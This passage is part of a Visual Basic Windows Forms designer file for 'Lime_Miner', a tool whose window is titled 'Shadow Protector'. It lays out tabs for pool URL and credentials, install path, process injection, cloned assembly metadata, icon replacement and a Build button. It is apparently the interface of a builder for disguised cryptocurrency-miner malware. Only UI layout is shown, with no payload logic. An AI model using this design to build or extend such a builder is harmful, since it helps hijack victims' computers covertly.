        Me.txtDescription.BackgroundColour = System.Drawing.Color.Black
        Me.txtDescription.BorderColour = System.Drawing.Color.FromArgb(CType(CType(180, Byte), Integer), CType(CType(180, Byte), Integer), CType(CType(180, Byte), Integer))
        Me.txtDescription.Enabled = False
        Me.txtDescription.Location = New System.Drawing.Point(10, 114)
        Me.txtDescription.MaxLength = 32767
        Me.txtDescription.Multiline = False
        Me.txtDescription.Name = "txtDescription"
        Me.txtDescription.ReadOnly = False
        Me.txtDescription.Size = New System.Drawing.Size(264, 38)
        Me.txtDescription.Style = Lime_Miner.HuraTextBox.Styles.Normal
        Me.txtDescription.TabIndex = 0
        Me.txtDescription.Text = "Description"
        Me.txtDescription.TextAlign = System.Windows.Forms.HorizontalAlignment.Left
        Me.txtDescription.TextColour = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.txtDescription.UseSystemPasswordChar = False
        '
        'txtProduct
        '
        Me.txtProduct.BackColor = System.Drawing.Color.Transparent
        Me.txtProduct.BackgroundColour = System.Drawing.Color.Black
        Me.txtProduct.BorderColour = System.Drawing.Color.FromArgb(CType(CType(180, Byte), Integer), CType(CType(180, Byte), Integer), CType(CType(180, Byte), Integer))
        Me.txtProduct.Enabled = False
        Me.txtProduct.Location = New System.Drawing.Point(334, 59)
        Me.txtProduct.MaxLength = 32767
        Me.txtProduct.Multiline = False
        Me.txtProduct.Name = "txtProduct"
        Me.txtProduct.ReadOnly = False
        Me.txtProduct.Size = New System.Drawing.Size(264, 38)
        Me.txtProduct.Style = Lime_Miner.HuraTextBox.Styles.Normal
        Me.txtProduct.TabIndex = 0
        Me.txtProduct.Text = "Product"
        Me.txtProduct.TextAlign = System.Windows.Forms.HorizontalAlignment.Left
        Me.txtProduct.TextColour = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.txtProduct.UseSystemPasswordChar = False
        '
        'txtTitle
        '
        Me.txtTitle.BackColor = System.Drawing.Color.Transparent
        Me.txtTitle.BackgroundColour = System.Drawing.Color.Black
        Me.txtTitle.BorderColour = System.Drawing.Color.FromArgb(CType(CType(180, Byte), Integer), CType(CType(180, Byte), Integer), CType(CType(180, Byte), Integer))
        Me.txtTitle.Enabled = False
        Me.txtTitle.Location = New System.Drawing.Point(10, 59)
        Me.txtTitle.MaxLength = 32767
        Me.txtTitle.Multiline = False
        Me.txtTitle.Name = "txtTitle"
        Me.txtTitle.ReadOnly = False
        Me.txtTitle.Size = New System.Drawing.Size(264, 38)
        Me.txtTitle.Style = Lime_Miner.HuraTextBox.Styles.Normal
        Me.txtTitle.TabIndex = 0
        Me.txtTitle.Text = "Title"
        Me.txtTitle.TextAlign = System.Windows.Forms.HorizontalAlignment.Left
        Me.txtTitle.TextColour = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.txtTitle.UseSystemPasswordChar = False
        '
        'ICO
        '
        Me.ICO.BackColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.ICO.Controls.Add(Me.chkIcon)
        Me.ICO.Controls.Add(Me.picIcon)
        Me.ICO.Controls.Add(Me.txtIconPath)
        Me.ICO.Controls.Add(Me.btnBrowseIcon)
        Me.ICO.Location = New System.Drawing.Point(4, 34)
        Me.ICO.Name = "ICO"
        Me.ICO.Size = New System.Drawing.Size(620, 346)
        Me.ICO.TabIndex = 4
        Me.ICO.Text = "::Icon::"
        '
        'chkIcon
        '
        Me.chkIcon.BaseColour = System.Drawing.Color.Black
        Me.chkIcon.BorderColour = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(219, Byte), Integer), CType(CType(106, Byte), Integer))
        Me.chkIcon.Checked = False
        Me.chkIcon.CheckedColour = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(219, Byte), Integer), CType(CType(106, Byte), Integer))
        Me.chkIcon.Cursor = System.Windows.Forms.Cursors.Hand
        Me.chkIcon.FontColour = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.chkIcon.Location = New System.Drawing.Point(10, 17)
        Me.chkIcon.Name = "chkIcon"
        Me.chkIcon.Size = New System.Drawing.Size(166, 22)
        Me.chkIcon.TabIndex = 21
        Me.chkIcon.Text = "OFF"
        '
        'picIcon
        '
        Me.picIcon.ErrorImage = Nothing
        Me.picIcon.Image = Global.Lime_Miner.My.Resources.Resources.nyan
        Me.picIcon.InitialImage = Nothing
        Me.picIcon.Location = New System.Drawing.Point(464, 141)
        Me.picIcon.Name = "picIcon"
        Me.picIcon.Size = New System.Drawing.Size(128, 128)
        Me.picIcon.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.picIcon.TabIndex = 11
        Me.picIcon.TabStop = False
        '
        'txtIconPath
        '
        Me.txtIconPath.BackColor = System.Drawing.Color.Transparent
        Me.txtIconPath.BackgroundColour = System.Drawing.Color.Black
        Me.txtIconPath.BorderColour = System.Drawing.Color.FromArgb(CType(CType(180, Byte), Integer), CType(CType(180, Byte), Integer), CType(CType(180, Byte), Integer))
        Me.txtIconPath.Location = New System.Drawing.Point(139, 73)
        Me.txtIconPath.MaxLength = 32767
        Me.txtIconPath.Multiline = False
        Me.txtIconPath.Name = "txtIconPath"
        Me.txtIconPath.ReadOnly = False
        Me.txtIconPath.Size = New System.Drawing.Size(453, 38)
        Me.txtIconPath.Style = Lime_Miner.HuraTextBox.Styles.Normal
        Me.txtIconPath.TabIndex = 10
        Me.txtIconPath.Text = "..."
        Me.txtIconPath.TextAlign = System.Windows.Forms.HorizontalAlignment.Left
        Me.txtIconPath.TextColour = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.txtIconPath.UseSystemPasswordChar = False
        '
        'btnBrowseIcon
        '
        Me.btnBrowseIcon.BackColor = System.Drawing.Color.Transparent
        Me.btnBrowseIcon.BaseColour = System.Drawing.Color.Black
        Me.btnBrowseIcon.BorderColour = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(219, Byte), Integer), CType(CType(106, Byte), Integer))
        Me.btnBrowseIcon.Enabled = False
        Me.btnBrowseIcon.FontColour = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.btnBrowseIcon.HoverColour = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.btnBrowseIcon.Location = New System.Drawing.Point(10, 73)
        Me.btnBrowseIcon.Name = "btnBrowseIcon"
        Me.btnBrowseIcon.PressedColour = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(219, Byte), Integer), CType(CType(106, Byte), Integer))
        Me.btnBrowseIcon.ProgressColour = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(191, Byte), Integer), CType(CType(255, Byte), Integer))
        Me.btnBrowseIcon.Size = New System.Drawing.Size(104, 38)
        Me.btnBrowseIcon.TabIndex = 9
        Me.btnBrowseIcon.Text = "Browse"
        '
        'BLD
        '
        Me.BLD.BackColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.BLD.Controls.Add(Me.txtLog)
        Me.BLD.Controls.Add(Me.btnBuild)
        Me.BLD.Location = New System.Drawing.Point(4, 34)
        Me.BLD.Name = "BLD"
        Me.BLD.Size = New System.Drawing.Size(620, 346)
        Me.BLD.TabIndex = 5
        Me.BLD.Text = "::Build::"
        '
        'txtLog
        '
        Me.txtLog.BackColor = System.Drawing.Color.Transparent
        Me.txtLog.BackgroundColour = System.Drawing.Color.Black
        Me.txtLog.BorderColour = System.Drawing.Color.FromArgb(CType(CType(180, Byte), Integer), CType(CType(180, Byte), Integer), CType(CType(180, Byte), Integer))
        Me.txtLog.Font = New System.Drawing.Font("Segoe UI", 8.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.txtLog.Location = New System.Drawing.Point(14, 102)
        Me.txtLog.MaxLength = 32767
        Me.txtLog.Multiline = True
        Me.txtLog.Name = "txtLog"
        Me.txtLog.ReadOnly = True
        Me.txtLog.Size = New System.Drawing.Size(599, 207)
        Me.txtLog.Style = Lime_Miner.HuraTextBox.Styles.Normal
        Me.txtLog.TabIndex = 15
        Me.txtLog.Text = "..."
        Me.txtLog.TextAlign = System.Windows.Forms.HorizontalAlignment.Left
        Me.txtLog.TextColour = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.txtLog.UseSystemPasswordChar = False
        '
        'btnBuild
        '
        Me.btnBuild.BackColor = System.Drawing.Color.Transparent
        Me.btnBuild.BaseColour = System.Drawing.Color.Black
        Me.btnBuild.BorderColour = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(219, Byte), Integer), CType(CType(106, Byte), Integer))
        Me.btnBuild.FontColour = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.btnBuild.HoverColour = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.btnBuild.Location = New System.Drawing.Point(25, 26)
        Me.btnBuild.Name = "btnBuild"
        Me.btnBuild.PressedColour = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(219, Byte), Integer), CType(CType(106, Byte), Integer))
        Me.btnBuild.ProgressColour = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(191, Byte), Integer), CType(CType(255, Byte), Integer))
        Me.btnBuild.Size = New System.Drawing.Size(104, 38)
        Me.btnBuild.TabIndex = 13
        Me.btnBuild.Text = "Build"
        '
        'Form1
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(9.0!, 20.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(665, 477)
        Me.Controls.Add(Me.HuraForm1)
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.Name = "Form1"
        Me.Opacity = 0.95R
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "Shadow Protector"
        Me.HuraForm1.ResumeLayout(False)
        Me.HuraTabControl1.ResumeLayout(False)
        Me.INF.ResumeLayout(False)
        Me.INF.PerformLayout()
        Me.INS.ResumeLayout(False)
        Me.INS.PerformLayout()
        Me.ASM.ResumeLayout(False)
        Me.ICO.ResumeLayout(False)
        CType(Me.picIcon, System.ComponentModel.ISupportInitialize).EndInit()
        Me.BLD.ResumeLayout(False)
        Me.ResumeLayout(False)

    End Sub

    Friend WithEvents HuraForm1 As HuraForm
    Friend WithEvents HuraTabControl1 As HuraTabControl
    Friend WithEvents BackgroundWorker1 As System.ComponentModel.BackgroundWorker
    Friend WithEvents HuraControlBox1 As HuraControlBox
    Friend WithEvents BackgroundWorker2 As System.ComponentModel.BackgroundWorker
    Friend WithEvents ASM As TabPage
    Friend WithEvents btn_assemblyRandom As HuraButton
    Friend WithEvents btn_assemblyClone As HuraButton
    Friend WithEvents num_Assembly4 As HuraTextBox
    Friend WithEvents num_Assembly3 As HuraTextBox
    Friend WithEvents num_Assembly2 As HuraTextBox
    Friend WithEvents num_Assembly1 As HuraTextBox
    Friend WithEvents txtTrademark As HuraTextBox
    Friend WithEvents txtCompany As HuraTextBox
    Friend WithEvents txtCopyright As HuraTextBox
    Friend WithEvents txtDescription As HuraTextBox
    Friend WithEvents txtProduct As HuraTextBox
    Friend WithEvents txtTitle As HuraTextBox
    Friend WithEvents INS As TabPage
    Friend WithEvents ICO As TabPage
    Friend WithEvents txtIconPath As HuraTextBox
    Friend WithEvents btnBrowseIcon As HuraButton
    Friend WithEvents txtInstallFileName As HuraTextBox
    Friend WithEvents BLD As TabPage
    Friend WithEvents txtLog As HuraTextBox
    Friend WithEvents btnBuild As HuraButton
    Friend WithEvents Label1 As Label
    Friend WithEvents picIcon As PictureBox
    Friend WithEvents Label2 As Label
    Friend WithEvents txtInstallPathMain As HuraComboBox
    Friend WithEvents Label5 As Label
    Friend WithEvents txtInjection As HuraComboBox
    Friend WithEvents chkAssembly As HuraCheckBox
    Friend WithEvents chkIcon As HuraCheckBox
    Friend WithEvents INF As TabPage
    Friend WithEvents Label8 As Label
    Friend WithEvents txtPoolURL As HuraTextBox
    Friend WithEvents Label7 As Label
    Friend WithEvents txtPoolPassowrd As HuraTextBox
    Friend WithEvents Label6 As Label
    Friend WithEvents txtPoolUsername As HuraTextBox
    Friend WithEvents chkInstall As HuraCheckBox
    Friend WithEvents HuraAlertBox1 As HuraAlertBox
    Friend WithEvents Timer1 As Timer
End Class
